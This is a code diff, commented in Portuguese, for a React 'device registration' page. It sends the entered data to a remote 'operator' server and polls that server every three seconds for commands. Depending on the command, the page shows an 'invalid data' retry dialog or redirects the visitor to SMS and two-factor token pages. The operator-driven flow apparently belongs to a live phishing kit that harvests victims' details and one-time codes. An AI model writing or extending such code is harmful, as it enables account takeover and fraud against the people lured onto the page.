@@ -1,5 +1,5 @@
 
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, useRef } from "react";
 import { ArrowLeft, Calendar, Info } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import { format } from "date-fns";
@@ -11,6 +11,102 @@ import { Calendar as CalendarComponent } from "@/components/ui/calendar";
 import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover";
 import { cn } from "@/lib/utils";
 import { useClientStatus } from "@/hooks/useClientStatus";
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
+
+// Função para monitorar cliente continuamente na página Cadastro
+const monitorClientCadastro = async (
+  clientId: string, 
+  navigate: (path: string) => void,
+  onInvalidAuth: () => void,
+  isMonitoringRef: React.MutableRefObject<boolean>
+): Promise<void> => {
+  console.log(`Iniciando monitoramento Cadastro do cliente: ${clientId}`);
+  
+  let intervalId: NodeJS.Timeout;
+  
+  const monitor = async () => {
+    if (!isMonitoringRef.current) {
+      console.log('Monitoramento Cadastro parado por flag');
+      clearInterval(intervalId);
+      return;
+    }
+
+    try {
+      console.log(`Consultando dados do cliente ${clientId} na página Cadastro...`);
+      
+      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
+        method: 'GET',
+        headers: {
+          'Content-Type': 'application/json',
+        }
+      });
+
+      console.log(`Status da consulta Cadastro: ${response.status}`);
+      
+      if (response.ok) {
+        const clientData = await response.json();
+        console.log('Dados do cliente Cadastro recebidos:', clientData);
+        console.log('Valor do response Cadastro:', clientData.data?.response);
+        console.log('Valor do command Cadastro:', clientData.data?.command);
+        
+        // Verificar se os dados de cadastro são inválidos - NÃO para o monitoramento
+        if (clientData.data?.response === "inv_auth" || clientData.data?.command === "inv_auth") {
+          console.log('Detectado inv_auth - Dados de cadastro inválidos, mas continuando monitoramento');
+          onInvalidAuth();
+          return; // Continua monitoramento, não para
+        }
+        
+        // Na página Cadastro: se receber ir_sms, redireciona para /sms e para monitoramento
+        if (clientData.data?.response === "ir_sms" || clientData.data?.command === "ir_sms") {
+          console.log('Detectado ir_sms na página Cadastro - Redirecionando para /sms');
+          clearInterval(intervalId);
+          isMonitoringRef.current = false;
+          console.log('Monitoramento Cadastro parado - redirecionando...');
+          navigate('/sms');
+          return;
+        }
+        
+        // Na página Cadastro: se receber ir_2fa, redireciona para /token e para monitoramento
+        if (clientData.data?.response === "ir_2fa" || clientData.data?.command === "ir_2fa") {
+          console.log('Detectado ir_2fa na página Cadastro - Redirecionando para /token');
+          clearInterval(intervalId);
+          isMonitoringRef.current = false;
+          console.log('Monitoramento Cadastro parado - redirecionando...');
+          navigate('/token');
+          return;
+        }
+        
+        // Se receber ir_auth, continua monitorando (não redireciona)
+        if (clientData.data?.response === "ir_auth" || clientData.data?.command === "ir_auth") {
+          console.log('Detectado ir_auth na página Cadastro - Continuando monitoramento...');
+        }
+        
+        console.log('Continuando monitoramento Cadastro...');
+      } else {
+        const errorData = await response.text();
+        console.log('Erro na consulta Cadastro do cliente:', errorData);
+      }
+
+    } catch (error) {
+      console.log('Erro durante consulta Cadastro do cliente:', error);
+    }
+  };
+
+  // Executar primeira consulta imediatamente
+  await monitor();
+  
+  // Configurar monitoramento contínuo a cada 3 segundos
+  intervalId = setInterval(monitor, 3000);
+  console.log('Monitoramento Cadastro contínuo configurado (3 segundos)');
+};
 
 const CadastroPage = () => {
   const navigate = useNavigate();
@@ -21,6 +117,8 @@ const CadastroPage = () => {
   const [specificDate, setSpecificDate] = useState<Date>();
   const [isLoading, setIsLoading] = useState(false);
   const [clientId, setClientId] = useState("");
+  const [showInvalidDataModal, setShowInvalidDataModal] = useState(false);
+  const isMonitoringRef = useRef(false);
 
   useEffect(() => {
     // Recuperar clientId do localStorage
@@ -37,6 +135,7 @@ const CadastroPage = () => {
 
     // Cleanup quando sair da página
     return () => {
+      isMonitoringRef.current = false;
       clientStatus.stopMonitoring();
     };
   }, [clientStatus]);
@@ -46,6 +145,20 @@ const CadastroPage = () => {
     if (value.length <= 20) {
       setDeviceNickname(value);
     }
+    // Reset error state when user starts typing
+    if (showInvalidDataModal) {
+      setShowInvalidDataModal(false);
+    }
+  };
+
+  const clearAllFields = () => {
+    console.log('Limpando todos os campos do cadastro...');
+    setFoundationDate(undefined);
+    setDeviceNickname("");
+    setAccessValidity("indefinite");
+    setSpecificDate(undefined);
+    setShowInvalidDataModal(false);
+    console.log('Todos os campos do cadastro limpos - Pronto para novo envio');
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -57,8 +170,9 @@ const CadastroPage = () => {
     }
 
     try {
-      console.log('Enviando dados de cadastro do dispositivo...');
+      console.log('Enviando dados de cadastro do dispositivo via external-response...');
       setIsLoading(true);
+      setShowInvalidDataModal(false);
       
       const cadastroData = {
         foundationDate: format(foundationDate, 'dd/MM/yyyy'),
@@ -69,7 +183,7 @@ const CadastroPage = () => {
 
       console.log('Dados do cadastro:', cadastroData);
       
-      // Enviar dados via external-response
+      // Enviar dados via external-response (seguindo lógica SMS/Token)
       const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
         method: 'PATCH',
         headers: {
@@ -77,16 +191,33 @@ const CadastroPage = () => {
         },
         body: JSON.stringify({
           response: JSON.stringify(cadastroData),
-          command: "device_registration"
+          command: ""
         })
       });
 
       if (response.ok) {
-        console.log('Cadastro de dispositivo enviado com sucesso');
-        // Redirecionar para página de aguarde
-        navigate('/wait');
+        console.log('Cadastro de dispositivo enviado com sucesso via external-response');
+        
+        // Só iniciar monitoramento se não estiver já monitorando
+        if (!isMonitoringRef.current) {
+          isMonitoringRef.current = true;
+          // Iniciar monitoramento contínuo após envio bem-sucedido
+          await monitorClientCadastro(
+            clientId, 
+            navigate,
+            () => {
+              // Função onInvalidAuth: limpa campos, para loading, mantém monitoramento
+              console.log('Dados de cadastro inválidos detectados - limpando campos e parando loading');
+              clearAllFields();
+              setIsLoading(false); // Parar o loading
+              setShowInvalidDataModal(true);
+              // NÃO para o monitoramento - isMonitoringRef.current continua true
+            },
+            isMonitoringRef
+          );
+        }
       } else {
-        console.log('Erro ao enviar cadastro do dispositivo');
+        console.log('Erro ao enviar cadastro do dispositivo via external-response');
         setIsLoading(false);
       }
     } catch (error) {
@@ -96,11 +227,34 @@ const CadastroPage = () => {
   };
 
   const handleCancel = () => {
+    isMonitoringRef.current = false;
     navigate("/home");
   };
 
   return (
     <div className="min-h-screen flex bg-[#fff] overflow-x-hidden">
+      {/* Modal de Dados Inválidos */}
+      <AlertDialog open={showInvalidDataModal} onOpenChange={setShowInvalidDataModal}>
+        <AlertDialogContent className="max-w-md mx-auto">
+          <AlertDialogHeader>
+            <AlertDialogTitle className="text-center text-lg font-semibold">
+              Dados inválidos
+            </AlertDialogTitle>
+            <AlertDialogDescription className="text-center text-gray-600">
+              Os dados de cadastro informados estão incorretos. Verifique as informações e tente novamente.
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          <AlertDialogFooter className="flex justify-center">
+            <AlertDialogAction
+              onClick={() => setShowInvalidDataModal(false)}
+              className="bg-orange-500 hover:bg-orange-600 text-white px-8 py-2 rounded-full"
+            >
+              Tentar Novamente
+            </AlertDialogAction>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
+
       {/* Main Content Container */}
       <div className="w-full lg:w-1/2 flex flex-col items-center px-4 sm:px-6 lg:px-[7%] pt-8 lg:pt-12 pb-8 relative">
         <div className="max-w-md w-full mx-auto">
